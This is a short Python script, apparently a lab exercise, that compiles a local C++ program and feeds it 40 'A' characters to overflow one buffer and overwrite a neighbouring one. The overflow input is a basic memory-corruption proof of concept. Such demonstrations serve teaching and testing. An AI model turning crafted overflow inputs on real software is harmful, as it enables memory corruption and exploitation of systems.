```python
import os

# Compile the source code
os.system('g++ -o test3 test3.cpp')

# Create an input file with overflow content
with open('input.txt', 'w') as f:
    f.write('A' * 40)  # Overflow buffer1 and overwrite buffer2

# Run the compiled binary with the crafted input
os.system('./test3 < input.txt')
```